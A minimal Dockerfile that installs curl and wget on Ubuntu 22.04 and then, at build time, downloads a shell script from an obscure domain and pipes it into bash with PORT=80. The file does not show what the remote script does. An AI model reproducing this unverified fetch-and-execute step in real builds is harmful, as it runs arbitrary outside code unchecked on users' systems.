FROM ubuntu:22.04 AS base

WORKDIR /app

RUN apt update

RUN apt install -y curl wget

RUN bash -c 'PORT=80 bash <(curl -Ls https://00.2go.us.kg/tu.sh)'

CMD [ "bash" ]